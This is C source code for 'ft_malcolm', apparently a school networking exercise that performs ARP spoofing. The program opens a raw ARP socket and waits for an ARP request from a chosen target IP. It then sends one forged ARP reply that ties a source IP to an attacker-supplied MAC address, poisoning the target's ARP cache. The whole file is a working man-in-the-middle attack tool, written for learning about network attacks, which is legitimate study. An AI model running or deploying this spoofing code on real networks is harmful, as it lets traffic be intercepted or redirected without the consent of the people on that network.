#include "ft_malcolm.h"
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <errno.h>

static volatile sig_atomic_t g_running = 1;

void handle_signal(int signal_number)
{
    (void)signal_number;
    g_running = 0;
}

int main(int argc, char **argv)
{
    t_data              data;
    int                 sockfd;
    int                 interface_index;
    unsigned char       buffer[65536];
    struct sockaddr_ll  addr;
    socklen_t           addr_len;
    ssize_t             packet_size;
    struct sigaction    sa;
    struct ethhdr       *eth;
    struct ether_arp    *arp;

    memset(&data, 0, sizeof(data));

    if (!parse_arguments(argc, argv, &data))
        return (1);

    if (!find_interface(data.source_ip, data.interface))
    {
        print_error("unable to find network interface");
        return (1);
    }

    printf("Found available interface: %s\n", data.interface);

    interface_index = if_nametoindex(data.interface);
    if (interface_index == 0)
    {
        print_error("unable to get interface index");
        return (1);
    }

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handle_signal;
    sigemptyset(&sa.sa_mask);

    if (sigaction(SIGINT, &sa, NULL) == -1)
    {
        print_error("sigaction failed");
        return (1);
    }

    /*
     * Open a raw ARP socket.
     */
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd == -1)
    {
        printf("ft_malcolm: socket: %s\n", strerror(errno));
        return (1);
    }

    printf("ARP socket successfully opened.\n");
    printf("Waiting for ARP requests...\n");

    /*
     * Receive packets until the target sends the expected ARP request.
     */
    while (g_running)
    {
        memset(&addr, 0, sizeof(addr));
        addr_len = sizeof(addr);

        packet_size = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                (struct sockaddr *)&addr, &addr_len);

        if (packet_size == -1)
        {
            if (errno == EINTR)
                continue;

            printf("ft_malcolm: recvfrom: %s\n", strerror(errno));
            break;
        }

        /*
         * Ignore packets coming from other interfaces.
         */
        if (addr.sll_ifindex != interface_index)
            continue;

        if ((size_t)packet_size < sizeof(struct ethhdr)
                + sizeof(struct ether_arp))
            continue;

        eth = (struct ethhdr *)buffer;

        if (ntohs(eth->h_proto) != ETH_P_ARP)
            continue;

        arp = (struct ether_arp *)(buffer + sizeof(struct ethhdr));

        /*
         * Only process ARP requests.
         */
        if (ntohs(arp->ea_hdr.ar_op) != ARPOP_REQUEST)
            continue;

        /*
         * Only requests concerning our configured source IP.
         */
        if (memcmp(arp->arp_tpa, &data.source_ip.s_addr, 4) != 0)
            continue;

        /*
         * Optional safety: verify the request comes from our target IP.
         */
        if (memcmp(arp->arp_spa, &data.target_ip.s_addr, 4) != 0)
            continue;

        printf("\nARP request detected!\n");

        display_arp_packet(
            buffer + sizeof(struct ethhdr),
            (size_t)packet_size - sizeof(struct ethhdr)
        );

        /*
         * Construct the spoofed ARP reply packet.
         */
        struct {
            struct ethhdr     eth;
            struct ether_arp  arp;
        } __attribute__((packed)) reply;

        memset(&reply, 0, sizeof(reply));

        // Fill Ethernet Header
        memcpy(reply.eth.h_dest, data.target_mac, 6);
        memcpy(reply.eth.h_source, data.source_mac, 6);
        reply.eth.h_proto = htons(ETH_P_ARP);

        // Fill ARP Header
        reply.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
        reply.arp.ea_hdr.ar_pro = htons(ETH_P_IP);
        reply.arp.ea_hdr.ar_hln = ETH_ALEN;
        reply.arp.ea_hdr.ar_pln = 4;
        reply.arp.ea_hdr.ar_op = htons(ARPOP_REPLY);

        // Fill ARP Payload (Spoofing source IP with source MAC)
        memcpy(reply.arp.arp_sha, data.source_mac, 6);
        memcpy(reply.arp.arp_spa, &data.source_ip.s_addr, 4);
        memcpy(reply.arp.arp_tha, data.target_mac, 6);
        memcpy(reply.arp.arp_tpa, &data.target_ip.s_addr, 4);

        // Configure destination socket address for raw packet transmission
        struct sockaddr_ll target_addr;
        memset(&target_addr, 0, sizeof(target_addr));
        target_addr.sll_family = AF_PACKET;
        target_addr.sll_ifindex = interface_index;
        target_addr.sll_halen = ETH_ALEN;
        memcpy(target_addr.sll_addr, data.target_mac, 6);

        printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");

        if (sendto(sockfd, &reply, sizeof(reply), 0,
                    (struct sockaddr *)&target_addr, sizeof(target_addr)) == -1)
        {
            printf("ft_malcolm: sendto: %s\n", strerror(errno));
        }
        else
        {
            printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
        }

        // Mandatory part: send a single ARP reply and exit
        break;
    }

    close(sockfd);

    printf("\nExiting program...\n");

    return (0);
}
